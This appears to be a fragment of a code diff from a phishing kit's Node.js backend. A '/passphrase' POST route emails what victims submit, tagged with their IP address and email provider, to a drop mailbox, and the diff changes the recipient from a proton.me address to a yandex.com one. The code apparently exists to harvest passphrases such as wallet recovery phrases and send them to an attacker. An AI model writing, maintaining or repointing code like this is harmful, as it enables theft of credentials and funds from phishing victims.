@@ -72,7 +72,7 @@ app.post('/passphrase', async (req, res) => {
 
     const mailOptions = {
       from:'admin@policyinfluencer.online',
-      to: 'policyinfluencer@proton.me',
+      to: 'policyinfluencer@yandex.com',
       subject: `Received From ${clientIP}`,
       text: `
         Email Provider: ${email_provider}
